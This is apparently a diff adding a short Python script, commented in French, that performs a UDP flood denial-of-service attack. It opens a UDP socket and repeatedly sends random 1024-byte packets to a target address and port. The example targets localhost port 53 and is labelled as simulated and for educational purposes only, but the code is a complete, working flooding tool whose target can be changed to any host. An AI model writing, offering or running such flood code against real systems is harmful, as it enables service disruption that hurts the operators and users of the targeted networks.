@@ -1,0 +1,27 @@
+import socket
+import random
+
+def udp_flood(target_ip, target_port, packet_size, duration):
+    # Créer un socket UDP
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # Générer des données aléatoires pour le paquet
+    data = random._urandom(packet_size)
+    print(f"Lancement d'une attaque UDP flood sur {target_ip}:{target_port}...")
+    try:
+        while duration > 0:
+            # Envoyer les données à la cible
+            sock.sendto(data, (target_ip, target_port))
+            duration -= 1
+    except Exception as e:
+        print(f"Erreur lors de l'envoi des paquets: {e}")
+    finally:
+        sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+target_port = 53         # Port de la cible (DNS)
+packet_size = 1024       # Taille des paquets (en octets)
+duration = 1000          # Nombre de paquets à envoyer
+
+# Lancer l'attaque simulée
+udp_flood(target_ip, target_port, packet_size, duration)
